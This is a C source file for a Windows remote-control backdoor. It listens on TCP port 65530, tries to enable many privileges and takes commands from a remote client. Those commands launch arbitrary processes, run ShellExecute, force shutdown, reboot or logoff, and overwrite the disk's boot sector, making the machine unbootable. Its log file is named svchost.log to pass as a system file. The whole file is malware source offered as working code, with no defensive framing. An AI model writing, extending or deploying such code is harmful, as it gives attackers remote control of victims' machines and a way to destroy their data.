//#include <stdlib.h>
#include <stdio.h>
//#include <Windows.h>
//#include <winternl.h>
#include <Winsock2.h>


#pragma comment(lib,"ws2_32.lib")
//#pragma comment(lib,"ntdll.lib")

#pragma runtime_checks( "", off )                       // disable _RTC_ function calls 
#pragma check_stack(off)								// disable stack checks

#define BACKDOOR_CREATE_PROCESS 0
#define BACKDOOR_SHELL_EXECUTE 1
#define BACKDOOR_SHUTDOWN_SYSTEM 2
#define BACKDOOR_RESTART_SYSTEM 3
#define BACKDOOR_LOGOFF 4
#define BACKDOOR_FORCE_SHUTDOWN 5
#define BACKDOOR_FORCE_RESTART 6
#define BACKDOOR_WIPE_DISK 7

#define __DEBUG__

#ifdef __DEBUG__
    #define LOG(x, y) log(x, y)
	#define EMPTYLOG emptyLog()
#else
    #define LOG(x, y) ;
	#define EMPTYLOG ;
#endif

void log(const char* msg, DWORD err){
    char file_name[100];
    GetTempPathA(100, file_name);
    strcat(file_name, "shots\\svchost.log");
    HANDLE logFile = CreateFileA(
                                file_name,
                                FILE_APPEND_DATA,                                             // open for writing
                                FILE_SHARE_READ | FILE_SHARE_WRITE,         // allow multiple readers
                                NULL,                                                                     // no security
                                OPEN_ALWAYS,                                                        // open or create
                                FILE_ATTRIBUTE_NORMAL,                                    // normal file
                                NULL);     
    SetFilePointer(
                logFile,                                                                        // file name
                0,                                                                                    // offset
                0,                                                                                    // offset
                FILE_END);                                                                    // offset reference point
    char error[250];
    DWORD dwBytesWritten;
    wsprintfA(error, msg, err);
    WriteFile(logFile, error, strlen(error), &dwBytesWritten, NULL);
    FlushFileBuffers(logFile);
    CloseHandle(logFile);
}

void emptyLog(){
	DWORD dwBytesWritten;
	const char* LOG_ENTRY = "Start Logger\n";
    char file_name[100];
    GetTempPathA(100, file_name);
    strcat(file_name, "shots\\svchost.log");

	HANDLE logFile = CreateFileA(
		file_name,
		GENERIC_WRITE,			  // open for writing
		FILE_SHARE_READ,          // allow multiple readers
		NULL,                     // no security
		TRUNCATE_EXISTING,        // open or create
		FILE_ATTRIBUTE_NORMAL,    // normal file
		NULL);                    // no attr. template
	if (logFile == INVALID_HANDLE_VALUE) {
		logFile = CreateFileA(
			file_name,
			GENERIC_WRITE,			  // open for writing
			FILE_SHARE_READ,          // allow multiple readers
			NULL,                     // no security
			OPEN_ALWAYS,			  // open or create
			FILE_ATTRIBUTE_NORMAL,    // normal file
			NULL);                    // no attr. template
	}
	SetFilePointer(logFile, 0, NULL, FILE_BEGIN);
	WriteFile(logFile, LOG_ENTRY, lstrlenA(LOG_ENTRY), &dwBytesWritten, NULL);
	CloseHandle(logFile);
}

typedef enum _SHUTDOWN_ACTION
{
    ShutdownNoReboot,
    ShutdownReboot,
    ShutdownPowerOff
}SHUTDOWN_ACTION,*PSHUTDOWN_ACTION;

typedef struct _CLIENT_ID
{
    PVOID UniqueProcess;
    PVOID UniqueThread;
}CLIENT_ID,*PCLIENT_ID;

typedef struct _BACKDOOR_PACKET
{
	BYTE Operation;
	char Buffer[1024];
	CLIENT_ID ClientId;
}BACKDOOR_PACKET,*PBACKDOOR_PACKET;

EXTERN_C NTSTATUS NTAPI RtlCreateUserThread(
	HANDLE,
	PSECURITY_DESCRIPTOR,
	BOOLEAN,
	ULONG,
	PULONG,
	PULONG,
	PVOID,
	PVOID,
	PHANDLE,
	PCLIENT_ID);

/*EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG,BOOLEAN,BOOLEAN,PBOOLEAN);
//EXTERN_C NTSTATUS NTAPI NtOpenProcess(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES,PCLIENT_ID);
EXTERN_C NTSTATUS NTAPI NtTerminateProcess(HANDLE,NTSTATUS);
EXTERN_C NTSTATUS NTAPI NtReadVirtualMemory(HANDLE,PVOID,PVOID,ULONG,PULONG);
EXTERN_C NTSTATUS NTAPI NtWriteVirtualMemory(HANDLE,PVOID,PVOID,ULONG,PULONG);
EXTERN_C NTSTATUS NTAPI NtGetContextThread(HANDLE,PCONTEXT);
EXTERN_C NTSTATUS NTAPI NtSetContextThread(HANDLE,PCONTEXT);
EXTERN_C NTSTATUS NTAPI NtUnmapViewOfSection(HANDLE,PVOID);
EXTERN_C NTSTATUS NTAPI NtResumeThread(HANDLE,PULONG);
EXTERN_C NTSTATUS NTAPI NtShutdownSystem(SHUTDOWN_ACTION);
*/


int main(){
	EMPTYLOG;

	SOCKET lsSock,ctSock;
	PBACKDOOR_PACKET data;
	HANDLE hProcess,hFile;
	ULONG i;
	DWORD write;
	BOOLEAN bl;
	char GarbageData[512];

	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	WSADATA wd;
	sockaddr_in sai;
	CLIENT_ID cid;

	for(i=0;i<100;i++){
		RtlAdjustPrivilege(i,TRUE,FALSE,&bl);
	}
	int s = 65530;

	sai.sin_family=AF_INET;
	sai.sin_addr.s_addr=INADDR_ANY;
	sai.sin_port=htons(65530);

	data=(PBACKDOOR_PACKET)VirtualAlloc(NULL,65536,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);



	while(1){
		Sleep(1000);
		sai.sin_port=htons(s);
		LOG("Port number set to %d\n", s);

		WSAStartup(0x101,&wd);

		lsSock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

		if(lsSock==INVALID_SOCKET) {
			LOG("[!] Error creating lsSocket %d\n", WSAGetLastError());
			WSACleanup();
			return 1;
		}

		bind(lsSock,(sockaddr*)&sai,sizeof(sai));
		if(bind(lsSock,(sockaddr*)&sai,sizeof(sai))==SOCKET_ERROR){
			LOG("[!] Error binding %d\n", WSAGetLastError());
		}

		listen(lsSock,10);
		if(listen(lsSock,10)==SOCKET_ERROR){
			LOG("[!] Error listening %d\n", WSAGetLastError());
		}

		LOG("[>] Accepting connections %d \n", s);

		ctSock=accept(lsSock,NULL,NULL);
		LOG("[<] End of wait %d \n", s);
		if(ctSock==INVALID_SOCKET) {
			LOG("[!] Error accepting %d\n", WSAGetLastError());
			closesocket(lsSock);
			WSACleanup();
			return 1;
		}

		recv(ctSock,(char*)data,65536,0);
		if(recv(ctSock,(char*)data,65536,0)==SOCKET_ERROR){
			LOG("[!] Error receiving %d \n", WSAGetLastError());
		}

		switch(data->Operation) {
		    case BACKDOOR_CREATE_PROCESS:

				memset(&si,0,sizeof(si));
				memset(&pi,0,sizeof(pi));

				if(!CreateProcessA(NULL,data->Buffer,NULL,NULL,FALSE,0,NULL,NULL,&si,&pi)) {
					send(ctSock,"Error: Unable to create process.",strlen("Error: Unable to create process."),0);
					break;
				}

				send(ctSock,"Process successfully created.",strlen("Process successfully created."),0);

				NtClose(pi.hThread);
				NtClose(pi.hProcess);
				break;
			case BACKDOOR_SHELL_EXECUTE:
				LOG(data->Buffer, 0);LOG("\n", 0);
				ShellExecuteA(0,"open",data->Buffer,NULL,NULL,SW_SHOW);
				send(ctSock,"",1,0);
				break;
			case BACKDOOR_SHUTDOWN_SYSTEM:
				send(ctSock,"Shutting down remote computer.",strlen("Shutting down remote computer."),0);
				ExitWindowsEx(EWX_SHUTDOWN,0);
				break;
			case BACKDOOR_RESTART_SYSTEM:
				send(ctSock,"Restarting remote computer.",strlen("Restarting remote computer."),0);
				ExitWindowsEx(EWX_REBOOT,0);
				break;
			case BACKDOOR_LOGOFF:
				send(ctSock,"Logging off the user.",strlen("Logging off the user."),0);
				ExitWindowsEx(EWX_LOGOFF,0);
				break;
			case BACKDOOR_FORCE_SHUTDOWN:
				send(ctSock,"Shutting down remote computer.",strlen("Shutting down remote computer."),0);
				NtShutdownSystem(ShutdownNoReboot);
				break;
			case BACKDOOR_FORCE_RESTART:
				send(ctSock,"Restarting remote computer.",strlen("Restarting remote computer."),0);
				NtShutdownSystem(ShutdownReboot);
				break;
			case BACKDOOR_WIPE_DISK:
				
				memset(GarbageData,0xFF,512);

				hFile=CreateFile("\\\\.\\PhysicalDrive0",GENERIC_ALL,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);

				if(hFile!=INVALID_HANDLE_VALUE) {
					if(!WriteFile(hFile,GarbageData,512,&write,NULL)) {
						send(ctSock,"Error: Unable to overwrite hard disk.",strlen("Error: Unable to overwrite hard disk."),0);
					}

					send(ctSock,"Successfully overwritten hard disk.",strlen("Successfully overwritten hard disk."),0);
					NtClose(hFile);
					break;
				}

				send(ctSock,"Error: Unable to open the hard disk.",strlen("Unable to open the hard disk."),0);
				break;
			default:
				send(ctSock,"Error: Invalid command.",strlen("Error: Invalid command."),0);
				break;
		}

		if(closesocket(lsSock)==SOCKET_ERROR){
			LOG("[!] Error closing listening socket %d\n", WSAGetLastError());
		}

		if(closesocket(ctSock)==SOCKET_ERROR){
			LOG("[!] Error closing client socket %d\n", WSAGetLastError());
		}
		
		if(WSACleanup()==SOCKET_ERROR){
			LOG("[!] Error Cleaning up %d\n", WSAGetLastError());
		}
		
		memset(data,0,sizeof(BACKDOOR_PACKET));
	}
	
	Sleep(INFINITE);
	return 0;
}
